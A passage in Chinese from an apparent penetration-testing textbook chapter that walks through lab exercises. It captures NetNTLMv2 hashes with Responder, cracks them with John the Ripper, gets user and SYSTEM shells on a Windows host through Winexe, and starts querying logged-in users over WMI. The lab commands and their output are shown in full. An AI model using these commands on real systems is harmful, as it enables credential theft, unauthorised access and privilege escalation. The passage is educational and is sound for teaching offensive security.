

注意，这里正在进行两种不同类型的中毒攻击。第一种是 NBNS 中毒 3，第二种是 LLMNR 4。由于指纹识别，这两个请求都会向我们提供关于底层主机操作系统的信息，我们可以看到请求主机的 IP 地址以及它试图连接的系统。我们得到的最后一段数据是 NetNTLMv2 哈希值及其用户名 5。我们可以尝试破解这个凭据，看看它是否能在系统上使用。

现在我们有了有效的哈希值，请在 Responder 窗口中按 CTRL-C 使其停止运行。下一步是将 Responder 中的哈希值导出为 John the Ripper 可处理的格式：

```
# ./DumpHash.py
Dumping NTLMV2 hashes:
User::DESKTOP-KRB3MSI:f302ca27a4602ce8:5C37059307A58D444EEC87E96F696DF1:0101000000000000C653150
DE09D2016DCBA4AD09CBA51E3000000000200080053004D00420030001001E005700409004E002D005000520048003400
3900320052005100410040046005600400014005300400420033002E00C006F0063000001006C00300340057004900400
2D00500052004800340039003200520051004100400460056002E0053004D00420030002E006C0006F0063006e003006500
14005300400420033002E006c006F0063006e003006C0070000000000C653150DE09D201606004000200000008003003000
000000000000100000000200000030CB99C348D4B4FPD0B6615C43E5A16D516B561BD859B2D9A6DPF04A2A9E8B850A00
10000000000000000000000000000000000000900220063006900660060073002F004E004F0054004100505020045004100400
48004F005300540000000000000000000000000000000000000000

Dumping NTLMv1 hashes:
```

我们可以在此处看到自己的 NetNTLMv2 哈希值，但目录中还创建了两个新文件：DumpNTLMv2.txt 和 DumpNTLMv1.txt。已知传递给 Responder 的哈希值为版本 2（v2），因此我们可以直接针对 v2 文件运行 John，看看它是否能破解密码：

```
# john DumpNTLMv2.txt
Using default input encoding: UTF-8
Rules/masks using ISO-8859-1
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/32])
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1   (User)
1g 0:00:00:00 DONE 2/3 (2017-08-23 21:13) 9.090g/s 158027p/s 158027c/s
158027C/s Password1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

John 已成功破解我们的密码，并为“User”用户找到了密码“Password1”。凭借这些凭据，我们可以远程访问系统。在本章的其余部分，我们将使用这些凭据与受害机器进行进一步交互。

## 使用 Winexe

Winexe 是一款在 Linux 上运行的 Windows 系统远程管理工具。使用 Winexe，我们可以在目标系统上运行应用程序或打开一个交互式命令提示符。额外的好处是，如果目标系统中的用户拥有提升的凭据，我们可以要求 Winexe 以“系统”身份启动我们的 shell，从而获得对系统的额外权限。

## Lab 10-2: 使用 Winexe 访问远程系统

我们已通过使用 Responder 获得受害系统的密码，但现在该如何与受害系统交互呢？使用 Winexe 是攻击者访问远程系统的常见方式。它通过目标系统上的隐藏 IPC 共享使用命名管道来创建管理服务。一旦该服务创建完成，我们就可以连接到它并以服务身份调用命令。

要验证目标系统是否共享了 IPC 共享，我们使用 smbclient 列出目标系统上的共享：

```
# smbclient -U User%Password1 -L 192.168.1.13
WARNING: The "syslog" option is deprecated
Domain=[DESKTOP-KRB3MSI] OS=[Windows 10 Enterprise 15063]
Server=[Windows 10 Enterprise 6.3]
```

| 共享名 | 类型 | 注释 |
|-----------|------|---------|
| ADMIN$ | Disk | 远程管理 |
| C$ | Disk | 默认共享 |
| IPC$ | IPC | 远程 IPC |
| Users | Disk | |

```
Connection to 192.168.1.13 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
NetBIOS over TCP disabled -- no workgroup available
```

在本章其余部分使用的许多工具中，我们将看到指定目标系统登录凭据的常见方式。格式是 <DOMAIN>\\<USERNAME>%<PASSWORD>。在这里，我们将用户凭据指定为 User%Password1，即我们的用户名和密码。-L 选项要求 smbclient 列出系统上的共享。我们可以看到有多个共享，包括我们的 IPC$ 共享。

既然知道 IPC 共享可用，让我们看看是否有能力启动命令提示符。我们将使用相同的语法来指定用户名，只不过这次，我们将使用语法 //<IP ADDRESS> 来指定目标系统。我们还添加 --uninstall 标志，该标志将在退出时卸载我们的服务。最后，我们为 cmd.exe 应用程序指定 cmd.exe，这使我们在目标系统上获得一个交互式 shell。

```
# winexe -U User%Password1 --uninstall //192.168.1.13 cmd.exe
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32>whoami
whoami
desktop-krb3msi\\user
```

我们现在看到 Windows 横幅和命令提示符，这意味着我们成功了。接下来，我们想要检查权限级别，以便确定我们正在运行的权限。通过输入 whoami，我们可以打印出 shell 的用户 ID。在这里，我们的用户是“user”用户，这意味着我们将拥有该用户的权限。

警告 如果你使用 CTRL-C 退出 shell，或者不使用 --uninstall 标志，创建的服务将保留在目标系统上。作为攻击者，这很不妥，因为你留下了所使用的远程访问技术的痕迹。作为渗透测试人员，留下工艺品会使很难确定是否发生了另一次入侵，并且在你离开系统后可能会触发红旗。这并不总是立即出现。六个月后，有人可能会问你是否留下了服务。因此，如果你不清理，你将不得不依赖笔记来回答一些非常不舒服的问题。

最后，要离开我们的 shell，可以在命令提示符下输入 exit。然后我们应该看到 Bash 提示符，这让我们知道已经离开了 shell。在服务器端，我们的服务正在被卸载，我们的连接已关闭。

## Lab 10-3: 使用 Winexe 获取提升的权限

在许多情况下，我们想要在目标系统上执行的操作需要提升的权限。在上一个实验中，我们能够以普通用户身份访问，但我们真的希望以 SYSTEM 用户身份访问。由于此用户对系统拥有完全权限，我们可以访问凭据、内存和其他有价值的目标。

要执行我们的攻击，我们将使用与上一个实验相同的所有选项，但我们会添加 --system 标志。这将为我们处理权限升级，最终结果是一个权限很高的 shell，如下所示：

```
# winexe -U User%Password1 --uninstall --system //192.168.1.13 cmd.exe
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

如您所见，我们现在正以 SYSTEM 用户身份访问受害机器。尽管这不属于本练习的范围，但这使我们可以转储凭据、创建新用户、重新配置设备以及执行许多普通用户可能无法完成的其他任务。

## 使用 WMI

Windows 管理规范 (WMI) 是一组用于跨企业访问系统配置信息的规范。WMI 允许管理员查看进程、补丁、硬件以及有关目标系统的许多其他信息。它具有根据调用用户的权限在目标系统上列出信息、创建新数据、删除数据和更改数据的能力。作为攻击者，这意味着我们可以使用 WMI 了解目标系统的大量信息，以及操纵系统状态。

## Lab 10-4: 使用 WMI 查询系统信息

知道可以使用 WMI 查询系统信息后，我们可能想了解目标系统的许多事情。例如，我们可能想知道谁正在交互式登录，以查看我们是否有被抓住的风险。在这个实验中，我们将使用两个不同的 WMI 查询来查看哪个用户或哪些用户已登录到目标系统。

要查询 WMI，我们必须构建一个 WMI 查询语言 (WQL) 查询，以获取我们要查找的信息。WQL 与用于数据库查询的结构化查询语言 (SQL) 相似。不过，要构建我们的查询，我们需要知道更多关于 WMI 的工作原理。我们需要知道的最重要的一点是我们将查询的类。本章末尾的“进一步阅读”部分包含一个条目，指向 Microsoft 通过 WMI 可访问的类列表。不过，在这个练习中，我们将只看两个类。

我们将要查询的第一个类是 win32_logonsession 类。1 该类包含有关已登录会话的信息、已执行的登录类型、开始时间和其他数据。让我们先组合一个查询，然后我们将看看如何使用 WMI 执行此查询：

```
select LogonType,LogonId from win32_logonsession
```

使用此查询，我们从 win32_logonsession 类中选择两个不同的数据片段。第一个是 LogonType，其中包含有关正在执行的登录类型的信息。第二个 LogonId 是登录会话的内部 ID 号。要执行此查询，我们必须使用 WMI 客户端。Kali 有两个用于 WMI 查询的客户端：第一个是 pth-wmic，第二个是 Impacket 脚本的一部分。pth-wmic 客户端更易于脚本化，因此我们将专注于该客户端。

pth-wmic 的语法与我们在上一个实验中使用的 Winexe 工具类似。我们将以相同的方式指定用户和主机，然后将 WQL 查询添加到命令末尾，如下所示：

